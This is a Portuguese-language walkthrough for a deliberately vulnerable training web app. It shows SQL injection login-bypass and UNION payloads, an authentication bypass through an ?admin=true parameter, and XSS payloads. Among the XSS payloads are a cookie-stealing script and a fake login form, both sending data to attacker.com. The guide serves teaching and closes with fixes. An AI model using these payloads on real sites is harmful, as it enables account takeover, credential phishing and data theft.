# üîì Guia Pr√°tico de Explora√ß√£o de Vulnerabilidades

Este documento demonstra como explorar as vulnerabilidades implementadas nesta aplica√ß√£o educacional.

## ‚ö†Ô∏è AVISO IMPORTANTE
**Esta aplica√ß√£o √© propositalmente vulner√°vel para fins educacionais. NUNCA use essas t√©cnicas em sistemas reais sem autoriza√ß√£o expl√≠cita.**

---

## üíâ SQL Injection

### 1. Bypass de Login

#### Payloads B√°sicos:
```sql
# Campo usu√°rio:
admin' OR '1'='1'--
admin' OR '1'='1'#
admin' OR 1=1--
' OR 1=1--
' OR '1'='1
```

#### Payloads Avan√ßados:
```sql
# Union-based injection para extrair dados:
admin' UNION SELECT 1,username,password,4,5,6,7 FROM users--

# Extrair informa√ß√µes do sistema:
admin' UNION SELECT 1,USER(),VERSION(),DATABASE(),5,6,7--

# Listar tabelas:
admin' UNION SELECT 1,table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()--
```

#### Como Testar:
1. Acesse `http://localhost/Azure-Web-App---Vuln/index.php`
2. No campo "Usu√°rio", digite: `admin' OR '1'='1'--`
3. No campo "Senha", digite qualquer coisa
4. Clique em "Login"
5. Voc√™ ser√° logado como admin sem saber a senha!

### 2. SQL Injection no Painel Admin

1. Acesse: `http://localhost/Azure-Web-App---Vuln/admin.php?admin=true`
2. Use a se√ß√£o "Executar Query Personalizada"
3. Experimente estas queries:

```sql
-- Ver todos os usu√°rios e senhas
SELECT username, password, email FROM users;

-- Ver configura√ß√µes sens√≠veis
SELECT * FROM config;

-- Ver tentativas de login (incluindo senhas)
SELECT username, password_attempted, ip_address FROM login_logs;

-- Informa√ß√µes do sistema
SELECT USER(), VERSION(), DATABASE(), @@datadir;

-- Listar todas as tabelas
SHOW TABLES;

-- Estrutura de uma tabela
DESCRIBE users;

-- Contar registros
SELECT 'users' as tabela, COUNT(*) as total FROM users
UNION ALL
SELECT 'comments', COUNT(*) FROM comments
UNION ALL  
SELECT 'config', COUNT(*) FROM config;
```

---

## üö® Cross-Site Scripting (XSS)

### 1. XSS Refletido nos Coment√°rios

#### Payloads B√°sicos:
```html
<script>alert('XSS B√°sico')</script>
<img src="x" onerror="alert('XSS via IMG')">
<svg onload="alert('XSS via SVG')">
```

#### Payloads Avan√ßados:
```html
<!-- Roubar cookies -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- Redirecionar para site malicioso -->
<script>window.location.href='http://malicious-site.com'</script>

<!-- Modificar o conte√∫do da p√°gina -->
<script>document.body.innerHTML='<h1>Site Hackeado!</h1>'</script>

<!-- Criar formul√°rio falso para phishing -->
<script>
document.body.innerHTML = `
<h2>Login Expirado - Entre novamente:</h2>
<form action="http://attacker.com/steal.php" method="post">
Username: <input name="user"><br>
Password: <input name="pass" type="password"><br>
<input type="submit" value="Login">
</form>`;
</script>
```

#### Como Testar:
1. Acesse a p√°gina principal
2. No campo "Nome", digite: `Hacker`
3. No campo "Coment√°rio", digite um dos payloads XSS
4. Clique em "Enviar Coment√°rio"
5. O JavaScript ser√° executado quando a p√°gina recarregar

### 2. XSS Persistente

Como os coment√°rios s√£o armazenados no banco de dados, o XSS √© persistente:
1. Insira um payload XSS em um coment√°rio
2. Toda vez que algu√©m acessar a p√°gina, o script ser√° executado
3. Isso afeta todos os visitantes, n√£o apenas quem inseriu

---

## üîç Information Disclosure

### 1. Exposi√ß√£o de Senhas

**Problema:** Senhas armazenadas em texto plano

**Como explorar:**
1. Acesse: `http://localhost/Azure-Web-App---Vuln/admin.php?admin=true`
2. Veja a se√ß√£o "Usu√°rios do Sistema"
3. Todas as senhas s√£o vis√≠veis em texto plano!

**Query direta:**
```sql
SELECT username, password FROM users;
```

### 2. Logs de Tentativas de Login

**Problema:** Sistema loga senhas tentadas

**Como explorar:**
1. No painel admin, veja "Logs de Login"
2. Todas as tentativas de senha ficam registradas
3. Atacantes podem ver senhas de outros usu√°rios

### 3. Configura√ß√µes Sens√≠veis Expostas

**Problema:** Chaves de API e configura√ß√µes em texto plano

**Como explorar:**
```sql
SELECT config_key, config_value FROM config;
```

Isso revela:
- Senhas de banco de dados
- Chaves de API
- Tokens secretos
- Configura√ß√µes de seguran√ßa

---

## üîê Bypass de Autentica√ß√£o

### 1. Bypass Trivial no Admin

**Problema:** Autentica√ß√£o baseada apenas em par√¢metro GET

**Como explorar:**
1. Tente acessar: `http://localhost/Azure-Web-App---Vuln/admin.php`
2. Ser√° negado o acesso
3. Adicione `?admin=true`: `http://localhost/Azure-Web-App---Vuln/admin.php?admin=true`
4. Acesso liberado sem nenhuma verifica√ß√£o real!

### 2. SQL Injection para Bypass

Use qualquer payload de SQL injection no login para bypasser a autentica√ß√£o.

---

## üõ†Ô∏è Ferramentas Recomendadas

### Para Testes Manuais:
- **Burp Suite Community**: Interceptar e modificar requisi√ß√µes
- **OWASP ZAP**: Scanner de vulnerabilidades gratuito
- **Browser Developer Tools**: Para analisar XSS

### Para Testes Automatizados:
- **SQLMap**: Para SQL injection automatizada
- **XSSStrike**: Para encontrar XSS automaticamente
- **Nikto**: Scanner web geral

---

## üìö Exemplos de Cen√°rios de Ataque

### Cen√°rio 1: Atacante Externo
1. **Reconhecimento**: Descobrir que a aplica√ß√£o existe
2. **SQL Injection**: Bypassar login com `admin' OR '1'='1'--`
3. **Privilege Escalation**: Acessar painel admin com `?admin=true`
4. **Data Exfiltration**: Extrair todos os dados via queries personalizadas

### Cen√°rio 2: XSS para Phishing
1. **XSS Injection**: Inserir script malicioso nos coment√°rios
2. **Persistence**: Script executa para todos os visitantes
3. **Credential Harvesting**: Criar formul√°rio falso de login
4. **Data Theft**: Roubar credenciais dos usu√°rios

### Cen√°rio 3: Insider Threat
1. **Privilege Abuse**: Funcion√°rio acessa logs de login
2. **Credential Theft**: V√™ senhas tentadas por outros usu√°rios
3. **Account Takeover**: Usa credenciais descobtas para acessar outras contas

---

## üîß Demonstra√ß√£o Passo a Passo

### Teste Completo de SQL Injection:

1. **Abra a aplica√ß√£o**:
   ```
   http://localhost/Azure-Web-App---Vuln/index.php
   ```

2. **Teste login normal** (deve falhar):
   - Usu√°rio: `admin`
   - Senha: `wrong_password`

3. **Teste SQL injection** (deve funcionar):
   - Usu√°rio: `admin' OR '1'='1'--`
   - Senha: `anything`

4. **Acesse o painel admin**:
   ```
   http://localhost/Azure-Web-App---Vuln/admin.php?admin=true
   ```

5. **Execute query maliciosa**:
   ```sql
   SELECT 'Dados roubados:' as status, username, password, email FROM users;
   ```

6. **Teste XSS**:
   - Nome: `Attacker`
   - Coment√°rio: `<script>alert('Site comprometido!')</script>`

---

## üõ°Ô∏è Li√ß√µes Aprendidas

### Como as vulnerabilidades poderiam ser corrigidas:

1. **SQL Injection**:
   - Use prepared statements
   - Valide e sanitize todas as entradas
   - Implemente whitelisting de queries

2. **XSS**:
   - Escape todas as sa√≠das HTML
   - Use Content Security Policy (CSP)
   - Valide entradas no servidor

3. **Information Disclosure**:
   - Hash senhas com salt
   - N√£o logue informa√ß√µes sens√≠veis
   - Criptografe dados em repouso

4. **Authentication Bypass**:
   - Implemente sess√µes adequadas
   - Use tokens seguros
   - Valide permiss√µes no servidor

5. **Access Control**:
   - Princ√≠pio do menor privil√©gio
   - Autentica√ß√£o multifator
   - Logs de auditoria seguros

---

## ‚ö†Ô∏è IMPORTANTE

**LEMBRE-SE SEMPRE:**
- Esta aplica√ß√£o √© vulner√°vel POR DESIGN
- Use apenas para aprendizado
- NUNCA teste em sistemas reais sem autoriza√ß√£o
- Mantenha em ambiente isolado
- As t√©cnicas mostradas podem ser ILEGAIS se usadas maliciosamente

**Objetivo:** Entender as vulnerabilidades para poder se proteger melhor contra elas.